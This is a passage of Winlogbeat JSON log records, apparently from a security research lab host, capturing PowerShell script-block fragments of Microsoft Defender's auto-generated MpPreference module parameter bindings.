'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('UILockdown')) {\n          [object]$__cmdletization_value = ${UILockdown}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {\n          [object]$__cmdletiz"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"= 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('Force')) {\n          [object]$__cmdletization_value = ${Force}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Add', $__cmdletization_methodParameters, $__cmdletization_returnValue)\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\n\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Add-MpPreference' -Alias '*'\n        \n\nfunction Remove-MpPreference\n{\n    [CmdletBinding(PositionalBinding=$false)]\n    \n    \n    param(\n    \n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionPath},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionExtension},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionProcess},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionIpAddress},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('rtsd')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${RealTimeScanDirection},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('qpiad')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${QuarantinePurgeItemsAfterDelay},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('rsd')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${RemediationScheduleDay},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('rst')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${RemediationScheduleTime},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('raat')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ReportingAdditionalActionTimeOut},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('rcto')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ReportingCriticalFailureTimeOut},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('rncto')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ReportingNonCriticalTimeOut},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('saclf')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ScanAvgCPULoadFactor},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('csbr')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${CheckForSignaturesBeforeRunningScan},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('spiad')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ScanPurgeItemsAfterDelay},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('soiie')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ScanOnlyIfIdleEnabled},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ScanParameters},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('scsd')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ScanScheduleDay},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('scsqst')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ScanScheduleQuickScanTime},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('scst')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ScanScheduleTime},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('tfsso')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ThrottleForScheduledScanOnly},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('sigfagp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SignatureFirstAuGracePeriod},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('sigagp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SignatureAuGracePeriod},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('sigdufss')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SignatureDefinitionUpdateFileSharesSources},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('sigduoswo')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SignatureDisableUpdateOnStartupWithoutEngine},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('sfo')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SignatureFallbackOrder},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('ssp','SecurityIntelligenceLocation','ssl')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SharedSignaturesPath},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('sigsd')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SignatureScheduleDay},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('sigst')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SignatureScheduleTime},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('siguci')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SignatureUpdateCatchupInterval},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('sigui')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SignatureUpdateInterval},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('sigbui')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SignatureBlobUpdateInterval},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('sigbfs')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SignatureBlobFileSharesSources},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('mcupd')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${MeteredConnectionUpdates},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('anpws')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${AllowNetworkProtectionOnWinServer},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('ddtgp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableDatagramProcessing},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableCpuThrottleOnIdleScans},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${MAPSReporting},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SubmitSamplesConsent},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dae')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableAutoExclusions},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dpm')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisablePrivacyMode},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('rstt')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${RandomizeScheduleTaskTimes},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('srt')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SchedulerRandomizationTime},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dbm')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableBehaviorMonitoring},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dips')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableIntrusionPreventionSystem},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dioavp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableIOAVProtection},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('drtm')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableRealtimeMonitoring},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dscrptsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableScriptScanning},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('darchsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableArchiveScanning},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dcfsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableCatchupFullScan},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dcqsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableCatchupQuickScan},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('demsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableEmailScanning},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('drdsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableRemovableDriveScanning},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('drp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmp"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":" Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableDnsParsing')) {\n          [object]$__cmdletization_value = ${DisableDnsParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableDnsOverTcpParsing')) {\n          [object]$__cmdletization_value = ${DisableDnsOverTcpParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableSshParsing')) {\n          [object]$__cmdletization_value = ${DisableSshParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('PlatformUpdatesChannel')) {\n          [object]$__cmdletization_value = ${PlatformUpdatesChannel}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EngineUpdatesChannel')) {\n          [object]$__cmdletization_value = ${EngineUpdatesChannel}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DefinitionUpdatesChannel')) {\n          [object]$__cmdletization_value = ${DefinitionUpdatesChannel}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableGradualRelease')) {\n          [object]$__cmdletization_value = ${DisableGradualRelease}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionDownLevel')) {\n          [object]$__cmdletization_value = ${AllowNetworkProtectionDownLevel}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AllowDatagramProcessingOnWinServer')) {\n          [object]$__cmdletization_value = ${AllowDatagramProcessingOnWinServer}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableDnsSinkhole')) {\n          [object]$__cmdletization_value = ${EnableDnsSinkhole}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableInboundConnectionFiltering')) {\n          [object]$__cmdletization_value = ${DisableInboundConnectionFiltering}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableRdpParsing')) {\n          [object]$__cmdletization_value = ${DisableRdpParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableNetworkProtectionPerfTelemetry')) {\n          [object]$__cmdletization_value = ${DisableNetworkProtectionPerfTelemetry}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletizatio"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"ation_value = ${ThreatIDDefaultAction_Ids}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {\n          [object]$__cmdletization_value = ${UnknownThreatDefaultAction}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          